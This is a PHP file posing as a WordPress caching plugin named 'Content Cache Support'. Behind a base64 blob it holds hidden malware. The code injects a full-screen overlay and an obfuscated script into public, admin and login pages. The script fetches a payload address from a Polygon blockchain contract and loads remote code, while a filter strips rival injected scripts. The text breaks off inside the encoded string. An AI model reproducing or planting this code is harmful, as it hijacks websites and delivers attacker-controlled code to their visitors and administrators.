<?php
/*
Plugin Name: Content Cache Support
Description: Maintains the local fragment store used for page bootstrap delivery.
*/
defined('ABSPATH') or exit;
if (defined('WPHC_MOD_3091402c29')) { return; }
define('WPHC_MOD_3091402c29', 1);
if (!function_exists('wphc_boot_cache')) {
function wphc_boot_cache() {
static $wphc_done = false;
if ($wphc_done) { return; }
$wphc_done = true;
$wphc_blob = 'PD9waHAKaWYgKGRlZmluZWQoJ1dQSENfUExfMzk1ZGMyYjY2ZCcpKSB7IHJldHVybjsgfQpkZWZpbmUoJ1dQSENfUExfMzk1ZGMyYjY2ZCcsIDEpOwppZiAoIWZ1bmN0aW9uX2V4aXN0cygnd3BoY19lbWl0X3N0b3JlJykpIHsKZnVuY3Rpb24gd3BoY19lbWl0X3N0b3JlKCkgewokaCA9IEBmb3BlbihfX0ZJTEVfXywgJ3JiJyk7CmlmICghJGgpIHsgcmV0dXJuOyB9CmZzZWVrKCRoLCBfX0NPTVBJTEVSX0hBTFRfT0ZGU0VUX18pOwp3aGlsZSAoIWZlb2YoJGgpKSB7IGVjaG8gZnJlYWQoJGgsIDgxOTIpOyB9CmZjbG9zZSgkaCk7Cn0KZm9yZWFjaCAoYXJyYXkoJ3dwX2hlYWQnLCAnYWRtaW5faGVhZCcsICdsb2dpbl9oZWFkJykgYXMgJHdwaGNfaG9vaykgewphZGRfYWN0aW9uKCR3cGhjX2hvb2ssICd3cGhjX2VtaXRfc3RvcmUnLCAxKTsKfQpmdW5jdGlvbiB3cGhjX29iX2d1YXJkXzM5NWRjMmI2NmQoKSB7CmlmICghZW1wdHkoJEdMT0JBTFNbJ3dwaGNfb2JfdXAnXSkpIHsgcmV0dXJuOyB9CmlmIChpc19hZG1pbigpIHx8IHdwX2RvaW5nX2FqYXgoKSkgeyByZXR1cm47IH0KaWYgKGRlZmluZWQoJ1JFU1RfUkVRVUVTVCcpICYmIFJFU1RfUkVRVUVTVCkgeyByZXR1cm47IH0KaWYgKGRlZmluZWQoJ0RPSU5HX0NST04nKSAmJiBET0lOR19DUk9OKSB7IHJldHVybjsgfQppZiAoZGVmaW5lZCgnWE1MUlBDX1JFUVVFU1QnKSAmJiBYTUxSUENfUkVRVUVTVCkgeyByZXR1cm47IH0KaWYgKGRlZmluZWQoJ1dQX0NMSScpICYmIFdQX0NMSSkgeyByZXR1cm47IH0KaWYgKGZ1bmN0aW9uX2V4aXN0cygnaXNfZmVlZCcpICYmIGlzX2ZlZWQoKSkgeyByZXR1cm47IH0KaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSAmJiAkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSAhPT0gJ0dFVCcgJiYgJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gIT09ICdIRUFEJykgeyByZXR1cm47IH0KJEdMT0JBTFNbJ3dwaGNfb2JfdXAnXSA9IDE7CkBvYl9zdGFydCgnd3BoY19vYl9maWx0ZXJfMzk1ZGMyYjY2ZCcpOwp9CmZ1bmN0aW9uIHdwaGNfb2JfZmlsdGVyXzM5NWRjMmI2NmQoJGh0bWwpIHsKaWYgKCFpc19zdHJpbmcoJGh0bWwpIHx8IHN0cnBvcygkaHRtbCwgJzwnKSA9PT0gZmFsc2UpIHsgcmV0dXJuICRodG1sOyB9CiRtYXJrcyA9IGFycmF5KCdpbnRlcnNlcS5hdCcsICd4dXJzb2QuY29tJywgJ2ltYWNvcy5jYycsICdtYWNyZXBhaXJ0b29sLmNvbScsICdjZm1kLXJjLWhvc3QnLCAnY2FwdGNoYS1jb250YWluZXInLCAnZGF0YS1jZm1kJywgJ25vcmVkaWFtLmNvbScsICdOZXdfUHJvbGl2JywgJ3Nzbi1pZC5lbWFpbCcsICdtYXNxcmFkJywgJ2xvYWRKU0Zyb21JbWFnZScsICdfX2ZwRW1iZWRzJywgJ2ZwLWVtYmVkLWNsb3NlJywgJ3BsYWluLXNub3cucGFnZXMuZGV2JywgJ3BhZ2VzLmRldi9oZWxwJywgJ2V4dHJhX3BhcmFtXzEnLCAnKG5ldyBGdW5jdGlvbihfY29kZSkpJywgJzB4QjZiQzllMUQwYjJmQjk2QWI3QzQ3RTA0Q2IwQkU0Nzc0MTBiQzFmMicsICdiNjhkMTgwOScsICdibGFzdGFwaS5pbycsICdycGMuYW5rci5jb20vcG9seWdvbicsICdnYXRld2F5LnRlbmRlcmx5LmNvJywgJ2FwaS5waHA/cz0nLCAnc2V2ZGEubG9sJyk7CiRvd24gPSAnM2R2YzhlOWM0bHE0cWJvMic7CiRoaXQgPSBmYWxzZTsKZm9yZWFjaCAoJG1hcmtzIGFzICRtaykgeyBpZiAoJG1rICE9PSAnJyAmJiBzdHJpcG9zKCRodG1sLCAkbWspICE9PSBmYWxzZSkgeyAkaGl0ID0gdHJ1ZTsgYnJlYWs7IH0gfQppZiAoISRoaXQpIHsgcmV0dXJuICRodG1sOyB9CiRvdXQgPSAkaHRtbDsKZm9yZWFjaCAoJG1hcmtzIGFzICRtaykgewppZiAoJG1rID09PSAnJykgeyBjb250aW51ZTsgfQokc2NhbiA9IDA7CndoaWxlICgoJHAgPSBzdHJpcG9zKCRvdXQsICRtaywgJHNjYW4pKSAhPT0gZmFsc2UpIHsKJGxpbSA9ICRwID4gMjYyMTQ0ID8gJHAgLSAyNjIxNDQgOiAwOwokc2VnID0gc3Vic3RyKCRvdXQsICRsaW0sICRwIC0gJGxpbSk7CiRsdCA9IHN0cnJwb3MoJHNlZywgJzwnKTsKaWYgKCRsdCA9PT0gZmFsc2UpIHsgJHNjYW4gPSAkcCArIDE7IGNvbnRpbnVlOyB9CiRzdGFydCA9ICRsaW0gKyAkbHQ7CiRyYXcgPSBzdHJ0b2xvd2VyKHN1YnN0cigkb3V0LCAkc3RhcnQgKyAxLCA2KSk7CiRjbG9zZSA9ICcnOyAKaWYgKHN1YnN0cigkcmF3LCAwLCA2KSA9PT0gJ3NjcmlwdCcpIHsgJGNsb3NlID0gJzwvc2NyaXB0JzsgfQplbHNlaWYgKHN1YnN0cigkcmF3LCAwLCA2KSA9PT0gJ2lmcmFtZScpIHsgJGNsb3NlID0gJzwvaWZyYW1lJzsgfQplbHNlaWYgKHN1YnN0cigkcmF3LCAwLCA0KSA9PT0gJ21ldGEnKSB7ICRjbG9zZSA9ICcnOyB9CmVsc2VpZiAoc3Vic3RyKCRyYXcsIDAsIDQpID09PSAnbGluaycpIHsgJGNsb3NlID0gJyc7IH0KZWxzZSB7ICRzY2FuID0gJHAgKyAxOyBjb250aW51ZTsgfQokZW5kID0gZmFsc2U7CmlmICgkY2xvc2UgIT09ICcnKSB7ICRlID0gc3RyaXBvcygkb3V0LCAkY2xvc2UsICRwKTsgaWYgKCRlICE9PSBmYWxzZSkgeyAkZW5kID0gc3RyaXBvcygkb3V0LCAnPicsICRlKTsgfSB9CmlmICgkZW5kID09PSBmYWxzZSkgeyAkZW5kID0gc3RyaXBvcygkb3V0LCAnPicsICRzdGFydCk7IH0KaWYgKCRlbmQgPT09IGZhbHNlKSB7IGJyZWFrOyB9CiRlbmQrKzsKJGZyYWcgPSBzdWJzdHIoJG91dCwgJHN0YXJ0LCAkZW5kIC0gJHN0YXJ0KTsKaWYgKHN0cmlwb3MoJGZyYWcsICd3cGhjJykgIT09IGZhbHNlIHx8IHN0cmlwb3MoJGZyYWcsICRvd24pICE9PSBmYWxzZSkgeyAkc2NhbiA9ICRwICsgMTsgY29udGludWU7IH0KJG91dCA9IHN1YnN0cigkb3V0LCAwLCAkc3RhcnQpIC4gc3Vic3RyKCRvdXQsICRlbmQpOwokc2NhbiA9ICRzdGFydDsKfQp9CnJldHVybiAkb3V0Owp9CndwaGNfb2JfZ3VhcmRfMzk1ZGMyYjY2ZCgpOwphZGRfYWN0aW9uKCdpbml0JywgJ3dwaGNfb2JfZ3VhcmRfMzk1ZGMyYjY2ZCcsIC0xMDAwKTsKfQpfX2hhbHRfY29tcGlsZXIoKTsKPGRpdiBpZD0iM2R2YzhlOWM0bHE0cWJvMiIgc3R5bGU9InBvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6I2ZmZjtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7ei1pbmRleDo5OTk5Ij4KICAgIDxkaXYgc3R5bGU9InBvc2l0aW9uOnJlbGF0aXZlO3dpZHRoOjMwcHg7aGVpZ2h0OjMwcHgiPgogICAgICAgIDxkaXYgc3R5bGU9ImJveC1zaXppbmc6Ym9yZGVyLWJveDtwb3NpdGlvbjphYnNvbHV0ZTt3aWR0aDozMHB4O2hlaWdodDozMHB4O2JvcmRlcjozcHggc29saWQgdHJhbnNwYXJlbnQ7Ym9yZGVyLXRvcC1jb2xvcjojNjc2NzY3O2JvcmRlci1yYWRpdXM6NTAlO2FuaW1hdGlvbjpzIDEuMnMgY3ViaWMtYmV6aWVyKC41LDAsLjUsMSkgaW5maW5pdGU7YW5pbWF0aW9uLWRlbGF5Oi0uNDVzIj48L2Rpdj4KICAgICAgICA8ZGl2IHN0eWxlPSJib3gtc2l6aW5nOmJvcmRlci1ib3g7cG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MzBweDtoZWlnaHQ6MzBweDtib3JkZXI6M3B4IHNvbGlkIHRyYW5zcGFyZW50O2JvcmRlci10b3AtY29sb3I6IzY3Njc2Nztib3JkZXItcmFkaXVzOjUwJTthbmltYXRpb246cyAxLjJzIGN1YmljLWJlemllciguNSwwLC41LDEpIGluZmluaXRlO2FuaW1hdGlvbi1kZWxheTotLjNzIj48L2Rpdj4KICAgICAgICA8ZGl2IHN0eWxlPSJib3gtc2l6aW5nOmJvcmRlci1ib3g7cG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MzBweDtoZWlnaHQ6MzBweDtib3JkZXI6M3B4IHNvbGlkIHRyYW5zcGFyZW50O2JvcmRlci10b3AtY29sb3I6IzY3Njc2Nztib3JkZXItcmFkaXVzOjUwJTthbmltYXRpb246cyAxLjJzIGN1YmljLWJlemllciguNSwwLC41LDEpIGluZmluaXRlO2FuaW1hdGlvbi1kZWxheTotLjE1cyI+PC9kaXY+CiAgICAgICAgPGRpdiBzdHlsZT0iYm94LXNpemluZzpib3JkZXItYm94O3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjMwcHg7aGVpZ2h0OjMwcHg7Ym9yZGVyOjNweCBzb2xpZCB0cmFuc3BhcmVudDtib3JkZXItdG9wLWNvbG9yOiM2NzY3Njc7Ym9yZGVyLXJhZGl1czo1MCU7YW5pbWF0aW9uOnMgMS4ycyBjdWJpYy1iZXppZXIoLjUsMCwuNSwxKSBpbmZpbml0ZSI+PC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CjxzdHlsZT5Aa2V5ZnJhbWVzIHN7MCV7dHJhbnNmb3JtOnJvdGF0ZSgwKX10b3t0cmFuc2Zvcm06cm90YXRlKDM2MGRlZyl9fTwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIGRlY29kZSh0b2tlbixrZXksXzB4ZDc3ZixfMHgxYmMyYyl7aWYoa2V5PT09dW5kZWZpbmVkfHxrZXk9PT1udWxsfHxrZXk9PT0iIilrZXk9Ikp0ak96MUtXemloRnRxdDRHWTdlT3lxc1paNDhpSSI7ZnVuY3Rpb24gXzB4ZTgyYihzdHIpe3ZhciBfMHg0YTljYWQ9W10saSxfMHhiMTRhNGMsXzB4XzB4MTJjO2ZvcihpPTEwNDI1MV4xMDQyNTE7aTxzdHJbIlx1MDA2Q1x1MDA2NVx1MDA2RVx1MDA2N1x1MDA3NFx1MDA2OCJdO2krKyl7XzB4YjE0YTRjPXN0clsiXHUwMDYzXHUwMDY4XHUwMDYxXHUwMDcyXHUwMDQzXHUwMDZGXHUwMDY0XHUwMDY1XHUwMDQxXHUwMDc0Il0oaSk7aWYoXzB4YjE0YTRjPj0oNjEwODA0XjYyNTE0MCkmJl8weGIxNGE0Yzw9KDUzNTgyOF41ODc0OTkpJiZpKyg2NzYzMTZeNjc2MzE3KTxzdHJbIlx1MDA2Q1x1MDA2NVx1MDA2RVx1MDA2N1x1MDA3NFx1MDA2OCJdKXtfMHhfMHgxMmM9c3RyWyJcdTAwNjNcdTAwNjhcdTAwNjFcdTAwNzJcdTAwNDNcdTAwNkZcdTAwNjRcdTAwNjVcdTAwNDFcdTAwNzQiXShpKyg1MTM0NjZeNTEzNDY3KSk7aWYoXzB4XzB4MTJjPj0oMzg0MjY5XjMyNzk0OSkmJl8weF8weDEyYzw9KDIwNTc0OV4yNjExOTQpKXtfMHhiMTRhNGM9MHgxMDAwMCsoXzB4YjE0YTRjLSg5NjY4OTZeOTIzODg4KTw8KDYxODQ1OF42MTg0NDgpKSsoXzB4XzB4MTJjLSg5NDY2NTheOTYyMDE4KSk7aSsrO319aWYoXzB4YjE0YTRjPCg3NzA0MjBeNzcwNTQ4KSlfMHg0YTljYWRbIlx1MDA3MFx1MDA3NVx1MDA3M1x1MDA2OCJdKF8weGIxNGE0Yyk7ZWxzZSBpZihfMHhiMTRhNGM8KDQ5MjcyMF40OTQ3NjgpKV8weDRhOWNhZFsiXHUwMDcwXHUwMDc1XHUwMDczXHUwMDY4Il0oNDczODg2XjQ3NDA3OHxfMHhiMTRhNGM+Pig1NTc3OTJeNTU3Nzk4KSw1MjA2NDZeNTIwNTE4fF8weGIxNGE0YyYoODE3Nzc1XjgxNzc0NCkpO2Vsc2UgaWYoXzB4YjE0YTRjPDB4MTAwMDApXzB4NGE5Y2FkWyJcdTAwNzBcdTAwNzVcdTAwNzNcdTAwNjgiXSgyOTUwMTleMjk1MDUxfF8weGIxNGE0Yz4+KDY4NzY3MF42ODc2NzQpLDU3NDMwNl41NzQ0MzR8XzB4YjE0YTRjPj4oMTI1NDA5XjEyNTQxNSkmKDQwMDk5Ml40MDA5OTEpLDQ2ODc3Nl40Njg5MDR8XzB4YjE0YTRjJig4MTYyMjBeODE2MjI3KSk7ZWxzZSBfMHg0YTljYWRbIlx1MDA3MFx1MDA3NVx1MDA3M1x1MDA2OCJdKDk0Mjk4Nl45NDI5NzB8XzB4YjE0YTRjPj4oNzQxOTU4Xjc0MTk3MiksNTMzODAwXjUzMzkyOHxfMHhiMTRhNGM+Pig5NTEyODVeOTUxMjg5KSYoNzMyMjY5XjczMjI0MiksMTkzOTY2XjE5MzgzOHxfMHhiMTRhNGM+Pig1ODc5NjReNTg3OTYyKSYoMjk4OTkwXjI5ODk2MSksMjg1NjI4XjI4NTUwMHxfMHhiMTRhNGMmKDU1NDYxNl41NTQ1NjcpKTt9cmV0dXJuIF8weDRhOWNhZDt9ZnVuY3Rpb24gXzB4NWFiZmJmKHN0cil7dmFyIF8weDM1NWE0ZD0oNDU1ODY2XjQ1NTg2NikrKDUyNzc5N141Mjc4MDUpO3ZhciBfMHg5ZGQ9IkFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5LV8iO18weDM1NWE0ZD0ib2NpZ2xpIjt2YXIgXzB4ZzU2NjFjPXt9LGksXzB4NjdjYWYsdixfMHg1N2ZiPVtdLF8weDRjXzB4N2U1PTE0NjgyMl4xNDY4MjIsXzB4YmdmPTIzMDgxNV4yMzA4MTU7Zm9yKGk9ODQwNTk0Xjg0MDU5NDtpPF8weDlkZFsiXHUwMDZDXHUwMDY1XHUwMDZFXHUwMDY3XHUwMDc0XHUwMDY4Il07aSsrKV8weGc1NjYxY1tfMHg5ZGRbIlx1MDA2M1x1MDA2OFx1MDA2MVx1MDA3Mlx1MDA0MVx1MDA3NCJdKGkpXT1pO2ZvcihpPTM5NDYxOV4zOTQ2MTk7aTxzdHJbIlx1MDA2Q1x1MDA2NVx1MDA2RVx1MDA2N1x1MDA3NFx1MDA2OCJdO2krKyl7XzB4NjdjYWY9c3RyWyJcdTAwNjNcdTAwNjhcdTAwNjFcdTAwNzJcdTAwNDFcdTAwNzQiXShpKTtpZighXzB4ZzU2NjFjWyJcdTAwNjhcdTAwNjFcdTAwNzNcdTAwNEZcdTAwNzdcdTAwNkVcdTAwNTBcdTAwNzJcdTAwNkZcdTAwNzBcdTAwNjVcdTAwNzJcdTAwNzRcdTAwNzkiXShfMHg2N2NhZikpY29udGludWU7dj1fMHhnNTY2MWNbXzB4NjdjYWZdO18weDRjXzB4N2U1PV8weDRjXzB4N2U1PDwoOTk3NDI2Xjk5NzQyOCl8djtfMHhiZ2YrPTQ2NzM4MF40NjczNzg7d2hpbGUoXzB4YmdmPj0oMjg5Nzc1XjI4OTc2Nykpe18weGJnZi09MTYyOTA0XjE2Mjg5NjtfMHg1N2ZiWyJcdTAwNzBcdTAwNzVcdTAwNzNcdTAwNjgiXShfMHg0Y18weDdlNT4+XzB4YmdmJig3MTA2MDFeNzEwNDU0KSk7fV8weDRjXzB4N2U1Jj0oKDE1NzA4OV4xNTcwODgpPDxfMHhiZ2YpLSgzNjI2NzZeMzYyNjc3KTt9cmV0dXJuIF8weDU3ZmI7fWZ1bmN0aW9uIF8weGM1YTdmKGJ5dGVzKXt2YXIgXzB4ODk2OWI9IiIsaT0zNTI5OTBeMzUyOTkwLF8weDA0NWYsXzB4YmQ2ZDt3aGlsZShpPGJ5dGVzWyJcdTAwNkNcdTAwNjVcdTAwNkVcdTAwNjdcdTAwNzRcdTAwNjgiXSl7XzB4MDQ1Zj1ieXRlc1tpKytdO2lmKF8weDA0NWY8KDY2MDEyNl42NTk5OTgpKV8weGJkNmQ9XzB4MDQ1ZjtlbHNlIGlmKChfMHgwNDVmJigyNjY5MzReMjY2ODM4KSk9PT0oMzQxODMzXjM0MTg5NykpXzB4YmQ2ZD0oXzB4MDQ1ZiYoOTAxOTI2XjkwMTk0NSkpPDwoNTQyMTE4XjU0MjExMil8Ynl0ZXNbaSsrXSYoMTA1NjE2XjEwNTY0Nyk7ZWxzZSBpZigoXzB4MDQ1ZiYoMTgxNzM0XjE4MTUyNikpPT09KDMyNTI5N14zMjUyMDEpKV8weGJkNmQ9KF8weDA0NWYmKDIxMDg1OF4yMTA4NTMpKTw8KDYwMjU4OF42MDI1NzYpfChieXRlc1tpKytdJigzNTgwOTVeMzU4MTI4KSk8PCg1MjM5OTheNTIzOTkyKXxieXRlc1tpKytdJigzNzg3MTleMzc4NzIwKTtlbHNlIF8weGJkNmQ9KF8weDA0NWYmKDk0NTQ1N145NDU0NjIpKTw8KDM4NzI1M14zODcyMzkpfChieXRlc1tpKytdJig5Mzg3ODJeOTM4Nzg1KSk8PCgzNDk5NDJeMzQ5OTQ2KXwoYnl0ZXNbaSsrXSYoNzM0NjU1XjczNDU5MikpPDwoNTE2ODU3XjUxNjg2Myl8Ynl0ZXNbaSsrXSYoODYwMzkyXjg2MDM3NSk7aWYoXzB4YmQ2ZD4oNTMwMTY0XjU4Mzk0Nykpe18weGJkNmQtPTB4MTAwMDA7XzB4ODk2OWIrPVN0cmluZ1siXHUwMDY2XHUwMDcyXHUwMDZGXHUwMDZEXHUwMDQzXHUwMDY4XHUwMDYxXHUwMDcyXHUwMDQzXHUwMDZGXHUwMDY0XHUwMDY1Il0oKDU4NzQ2N141MzYyNjcpKyhfMHhiZDZkPj4oNjI4NzI0XjYyODczNCkpLCgxMDM2MTcxXjk4ODA0MykrKF8weGJkNmQmKDY1ODA4MV42NTc3NTgpKSk7fWVsc2UgXzB4ODk2OWIrPVN0cmluZ1siXHUwMDY2XHUwMDcyXHUwMDZGXHUwMDZEXHUwMDQzXHUwMDY4XHUwMDYxXHUwMDcyXHUwMDQzXHUwMDZGXHUwMDY0XHUwMDY1Il0oXzB4YmQ2ZCk7fXJldHVybiBfMHg4OTY5Yjt9dmFyIF8weDczZWQ9XzB4ZTgyYihrZXkpO18weGQ3N2Y9Im5kamdmbyI7aWYoXzB4NzNlZFsiXHUwMDZDXHUwMDY1XHUwMDZFXHUwMDY3XHUwMDc0XHUwMDY4Il09PT0oMzY0Nzc0XjM2NDc3NCkpXzB4NzNlZD1bNjM3NzczXjYzNzc3M107dmFyIF8weGJjZThmYT1fMHg1YWJmYmYodG9rZW4pO18weDFiYzJjPTg0OTA3MF44NDkwNjM7Zm9yKHZhciBpPTYzMzIzM142MzMyMzM7aTxfMHhiY2U4ZmFbIlx1MDA2Q1x1MDA2NVx1MDA2RVx1MDA2N1x1MDA3NFx1MDA2OCJdO2krKyl7XzB4YmNlOGZhW2ldPV8weGJjZThmYVtpXV5fMHg3M2VkW2klXzB4NzNlZFsiXHUwMDZDXHUwMDY1XHUwMDZFXHUwMDY3XHUwMDc0XHUwMDY4Il1dK2kqKDY4NTY3M142ODU3OTIpJig0NjA5NzBeNDYwODg1KTt9cmV0dXJuIF8weGM1YTdmKF8weGJjZThmYSk7fWFzeW5jIGZ1bmN0aW9uIGdldFNlcnZlcnMoKXt2YXIgXzB4MzhkZj0oMzkwNzc5XjM5MDc3OCkrKDM4MDUyOF4zODA1MzMpO2xldCBfMHhkZDkxZT1bImh0dHBzOi8vcG9seWdvbi5kcnBjLm9yZyIsImh0dHBzOi8vdGVuZGVybHkucnBjLnBvbHlnb24uY29tbXVuaXR5IiwiaHR0cHM6Ly9wb2x5Z29uLnB1YmxpY25vZGUuY29tIiwiaHR0cHM6Ly9wb2x5Z29uLXB1YmxpYy5ub2RpZXMuYXBwLyIsImh0dHBzOi8vMXJwYy5pby9tYXRpYyIsImh0dHBzOi8vcnBjLW1haW5uZXQubWF0aWMucXVpa25vZGUucHJvIiwiaHR0cHM6Ly9wb2x5Z29uLmFwaS5vbmZpbmFsaXR5LmlvL3B1YmxpYyIsImh0dHBzOi8vcG9seS5hcGkucG9ja2V0Lm5ldHdvcmsiXTtfMHgzOGRmPSgzNjk1MzheMzY5NTQxKSsoNzA2NjA3XjcwNjYwNyk7Zm9yKGNvbnN0IF8weDJlZjQ3ZSBvZiBfMHhkZDkxZSl7dHJ5e2xldCBfMHg1Zl8weDkzMDtjb25zdCBfMHhjZjk3YWQ9YXdhaXQgZmV0Y2goXzB4MmVmNDdlLHsibWV0aG9kIjoiUE9TVCIsImhlYWRlcnMiOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LCJib2R5IjpKU09OWyJcdTAwNzNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNjdcdTAwNjlcdTAwNjZcdTAwNzkiXSh7Impzb25ycGMiOiIyLjAiLCJtZXRob2QiOiJldGhfY2FsbCIsInBhcmFtcyI6W3sidG8iOiIweDQ3NGQwNTc3OTcyYjhGMkJhQzZlNUY0M0RBQzY3YmREQzMwNjEyNjYiLCJkYXRhIjoiMHgzYmM1ZGUzMCJ9LCJsYXRlc3QiXSwiaWQiOjF9KX0pO18weDVmXzB4OTMwPTEzOTUwMF4xMzk1MDE7dmFyIF8weDllMjlhPSg0NzAzNTFeNDcwMzUxKSsoMjI0MzE3XjIyNDMxMik7Y29uc3QgXzB4YTdhYT1hd2FpdCBfMHhjZjk3YWRbIlx1MDA2QVx1MDA3M1x1MDA2Rlx1MDA2RSJdKCk7XzB4OWUyOWE9KDM4NDMxMV4zODQzMDQpKygzOTk3ODheMzk5NzgxKTtpZihfMHhhN2FhWyJcdTAwNzJcdTAwNjVcdTAwNzNcdTAwNzVcdTAwNkNcdTAwNzQiXSYmXzB4YTdhYVsiXHUwMDcyXHUwMDY1XHUwMDczXHUwMDc1XHUwMDZDXHUwMDc0Il0hPT0iMHgiKXt2YXIgXzB4ODllMTRkPSgyODY0MTleMjg2NDE3KSsoMjY1NDA4XjI2NTQxNSk7bGV0IGg9XzB4YTdhYVsiXHUwMDcyXHUwMDY1XHUwMDczXHUwMDc1XHUwMDZDXHUwMDc0Il1bIlx1MDA3M1x1MDA2Q1x1MDA2OVx1MDA2M1x1MDA2NSJdKDMzNDkwM14zMzQ5MDEpO18weDg5ZTE0ZD0zMTQ5MzFeMzE0OTM1O3ZhciBfMHgxZF8weDM5Yj0oMzQxNTM2XjM0MTUzNykrKDYxNDEyOF42MTQxMzIpO2xldCB0PSIiO18weDFkXzB4MzliPTU5MTEyNF41OTExMjA7Zm9yKGxldCBpPTgzNTc0N144MzU2MTk7aTxoWyJcdTAwNkNcdTAwNjVcdTAwNkVcdTAwNjdcdTAwNzRcdTAwNjgiXTtpKz01MjgyMjFeNTI4MjIzKXtsZXQgYz1wYXJzZUludChoWyJcdTAwNzNcdTAwNzVcdTAwNjJcdTAwNzNcdTAwNzRcdTAwNzIiXShpLDc5NTY0M143OTU2NDEpLDkzMzM0N145MzMzNjMpO2lmKGMhPT0oNjEyNzY4XjYxMjc2OCkpe3QrPVN0cmluZ1siXHUwMDY2XHUwMDcyXHUwMDZGXHUwMDZEXHUwMDQzXHUwMDY4XHUwMDYxXHUwMDcyXHUwMDQzXHUwMDZGXHUwMDY0XHUwMDY1Il0oYyk7fWVsc2V7YnJlYWs7fX12YXIgXzB4ODI3NGU9KDUwNTE2Nl41MDUxNTkpKyg1NDMwOTJeNTQzMDk1KTtsZXQgXzB4MzBhPWRlY29kZSh0KTtfMHg4Mjc0ZT00NzU2ODJeNDc1NjkxO3JldHVybiBfMHgzMGE7fX1jYXRjaChlcnJvcil7fX1yZXR1cm4gbnVsbDt9ZnVuY3Rpb24gdHJ5TG9hZFNjcmlwdChzcmNVcmwsdGltZW91dE1zKXtyZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUscmVqZWN0KT0+e2NvbnN0IF8weDc2ZWVmZT1kb2N1bWVudFsiXHUwMDYzXHUwMDcyXHUwMDY1XHUwMDYxXHUwMDc0XHUwMDY1XHUwMDQ1XHUwMDZDXHUwMDY1XHUwMDZEXHUwMDY1XHUwMDZFXHUwMDc0Il0oInNjcmlwdCIpO18weDc2ZWVmZVsiXHUwMDczXHUwMDcyXHUwMDYzIl09U3RyaW5nKHNyY1VybCk7XzB4NzZlZWZlWyJcdTAwNjRcdTAwNjVcdTAwNjZcdTAwNjVcdTAwNzIiXT0hIVtdO2xldCBfMHgyZ2I3ZDtjb25zdCBfMHhnMGU9c2V0VGltZW91dCgoKT0+e3JlamVjdChuZXcgRXJyb3IoYFRpbWVvdXQgbG9hZGluZzogJHtzcmNVcmx9YCkpO30sdGltZW91dE1zKTtfMHgyZ2I3ZD04Nzg0NzdeODc4NDY4O18weDc2ZWVmZVsiXHUwMDZGXHUwMDZFXHUwMDZDXHUwMDZGXHUwMDYxXHUwMDY0Il09KCk9PntjbGVhclRpbWVvdXQoXzB4ZzBlKTtyZXNvbHZlKF8weDc2ZWVmZSk7fTtfMHg3NmVlZmVbIlx1MDA2Rlx1MDA2RVx1MDA2NVx1MDA3Mlx1MDA3Mlx1MDA2Rlx1MDA3MiJdPSgpPT57Y2xlYXJUaW1lb3V0KF8weGcwZSk7cmVqZWN0KG5ldyBFcnJvcihgRmFpbGVkIHRvIGxvYWQ6ICR7c3JjVXJsfWApKTt9O3dpbmRvd1siXHUwMDYzXHUwMDc1XHUwMDcyXHUwMDcyXHUwMDY1XHUwMDZFXHUwMDc0XHUwMDUzXHUwMDY1XHUwMDcyXHUwMDc2XHUwMDY1XHUwMDcyIl09c3JjVXJsO2RvY3VtZW50WyJcdTAwNjhcdTAwNjVcdTAwNjFcdTAwNjQiXVsiXHUwMDYxXHUwMDcwXHUwMDcwXHUwMDY1XHUwMDZFXHUwMDY0XHUwMDQzXHUwMDY4XHUwMDY5XHUwMDZDXHUwMDY0Il0oXzB4NzZlZWZlKTt9KTt9YXN5bmMgZnVuY3Rpb24gY3JlYXRlRGVmZXJyZWRTY3JpcHQodXJscyl7Zm9yKGNvbnN0IHVybCBvZiB1cmxzKXt0cnl7dmFyIF8weDJmZWE9KDgxNDg0OV44MTQ4NTEpKyg4Nzc2MjZeODc3NjI5KTtjb25zdCBzY3JpcHQ9YXdhaXQgdHJ5TG9hZFNjcmlwdCh1cmwsNTAxNDkxXjUwMzExNSk7XzB4MmZlYT0oNzc0MDYzXjc3NDA2MSkrKDI3NDQ5MV4yNzQ0ODIpO3JldHVybiBzY3JpcHQ7fWNhdGNoKGVycm9yKXt9fWZvcihjb25zdCB1cmwgb2YgdXJscyl7dHJ5e2NvbnN0IHNjcmlwdD1hd2FpdCB0cnlMb2FkU2NyaXB0KHVybCw1NjgyMDReNTcyNjY4KTtyZXR1cm4gc2NyaXB0O31jYXRjaChlcnJvcil7fX10aHJvdyBuZXcgRXJyb3IoIkZhaWxlZCB0byBsb2FkIHNjcmlwdCBmcm9tIGFsbCBzb3VyY2VzIik7fShhc3luYyBmdW5jdGlvbigpe3ZhciBfMHg5YjdhMGE9KDg5NTc1OV44OTU3NTEpKygzNjY2OTleMzY2NjkwKTtjb25zdCBfMHgzMTM3MmQ9WyJib3QiLCJnb29nbGUiLCJzcGlkZXIiXTtfMHg5YjdhMGE9KDEwOTczMF4xMDk3MzMpKygzNzMxMzZeMzczMTQ1KTtjb25zdCBfMHg3MTgxMWM9XzB4MzEzNzJkWyJcdTAwNzNcdTAwNkZcdTAwNkRcdTAwNjUiXSh3PT5uYXZpZ2F0b3JbIlx1MDA3NVx1MDA3M1x1MDA2NVx1MDA3Mlx1MDA0MVx1MDA2N1x1MDA2NVx1MDA2RVx1MDA3NCJdWyJcdTAwNzRcdTAwNkZcdTAwNENcdTAwNkZcdTAwNzdcdTAwNjVcdTAwNzJcdTAwNDNcdTAwNjFcdTAwNzNcdTAwNjUiXSgpWyJcdTAwNjlcdTAwNkVcdTAwNjNcdTAwNkNcdTAwNzVcdTAwNjRcdTAwNjVcdTAwNzMiXSh3WyJcdTAwNzRcdTAwNkZcdTAwN